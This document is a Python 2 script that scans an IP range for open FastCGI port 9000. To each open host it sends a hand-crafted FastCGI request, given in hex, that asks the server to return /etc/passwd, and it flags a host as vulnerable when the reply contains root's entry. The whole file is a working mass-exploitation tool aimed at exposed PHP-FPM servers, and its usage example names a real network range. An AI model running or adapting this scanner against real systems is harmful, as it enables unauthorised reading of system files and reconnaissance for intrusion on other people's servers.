#!/usr/bin/env python
# -*- coding: utf-8 -*-
#cgi.py -a 110.164.68.1/24 -t 50
import threading
import argparse
import socket
import Queue
import netaddr
import time
import sys
class CgiScan:
    def __init__(self,addr,tnum):
        self.scanque = Queue.Queue()
        self.tnum = tnum
        self.tmpnum = tnum
        self.lock = threading.Lock()
        self.openlist = []
        if addr.find("-") != -1:
            for ip in netaddr.IPRange(addr.split("-")[0],addr.split("-")[1]): 
                self.scanque.put(ip)
        else:
            for ip in netaddr.IPNetwork(addr).iter_hosts(): 
                self.scanque.put(ip)
        self.qsize = self.scanque.qsize()
        for i in range(tnum):
            t = threading.Thread(target=self.ScanPort)
            t.setDaemon(True)
            t.start()
        while self.tmpnum > 0:
            time.sleep(1.0)
        print '[*]:scan  fastcgi vulnerable...'
        for ip in self.openlist:
            self.test_fastcgi(ip)

    def test_fastcgi(self,ip):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM); sock.settimeout(5.0)
        sock.connect((ip, 9000))
        data = """
        01 01 00 01 00 08 00 00  00 01 00 00 00 00 00 00
        01 04 00 01 00 8f 01 00  0e 03 52 45 51 55 45 53 
        54 5f 4d 45 54 48 4f 44  47 45 54 0f 08 53 45 52 
        56 45 52 5f 50 52 4f 54  4f 43 4f 4c 48 54 54 50 
        2f 31 2e 31 0d 01 44 4f  43 55 4d 45 4e 54 5f 52
        4f 4f 54 2f 0b 09 52 45  4d 4f 54 45 5f 41 44 44
        52 31 32 37 2e 30 2e 30  2e 31 0f 0b 53 43 52 49 
        50 54 5f 46 49 4c 45 4e  41 4d 45 2f 65 74 63 2f 
        70 61 73 73 77 64 0f 10  53 45 52 56 45 52 5f 53
        4f 46 54 57 41 52 45 67  6f 20 2f 20 66 63 67 69
        63 6c 69 65 6e 74 20 00  01 04 00 01 00 00 00 00
        """
        data_s = ''
        for _ in data.split():
            data_s += chr(int(_,16))
        sock.send(data_s)
        try:
            ret = sock.recv(1024)
            if ret.find(':root:') > 0:
                #print ret
                print '[+] %s is vulnerable!' % ip
        except Exception, e:
            pass
                
        sock.close()

    def ScanPort(self):
        while self.scanque.qsize() > 0:
            try:
                ip = self.scanque.get()
                self.lock.acquire()
                print str(ip) + "        \r",
                self.lock.release()
                s = socket.socket()
                s.settimeout(3)
                s.connect((str(ip), 9000))
                self.lock.acquire()
                print ip," 9000 open"
                self.openlist.append(str(ip))
                self.lock.release()
            except:
                pass
        self.tmpnum -= 1
if __name__ == "__main__":
    parse = argparse.ArgumentParser(description="CgiScan")
    parse.add_argument('-a','--addr', type=str, help="ipaddress")
    parse.add_argument('-t','--thread', type=int, help="Thread Number",default=100)
    args = parse.parse_args()
    if not args.addr:
        parse.print_help()
        sys.exit(0)
    addr = args.addr
    tnum = args.thread
    CgiScan(addr,tnum)